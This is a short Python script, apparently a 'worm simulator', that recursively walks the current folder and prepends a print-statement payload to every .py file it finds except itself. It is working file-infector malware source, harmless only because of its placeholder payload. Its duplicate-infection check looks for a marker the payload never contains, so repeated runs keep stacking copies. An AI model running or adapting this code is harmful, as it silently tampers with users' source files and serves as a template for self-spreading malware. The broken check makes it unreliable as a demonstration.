import os

#Folder: infect
FOLDER_PATH = "."

#Worm

WORM_CODE = '''
print("This file has been infected!")'''

def infect_file(file_path):
    try:
        with open(file_path, "r+", encoding="utf-8", errors="ignore")as f:
            content = f.read()
            if"# WORM PAYLOAD" not in content:
                f.seek(0, 0)
                f.write(WORM_CODE + "\n" + content)
                return True
    except Exception as e:
        print(f"Error infecting {file_path}: {e}")
    return False

def main():
    infected = []
    for root, _, files in os.walk(FOLDER_PATH):
        for file in files:
            if file.endswith(".py") and file != "worm_simulator.py":
                full_path = os.path.join(root, file)
                if infect_file(full_path):
                    infected.append(file)
                    
    print("\n Infection is complete. The Infected files are:")
    for f in infected:
        print(f)
        
if __name__ == "__main__":
    main()
            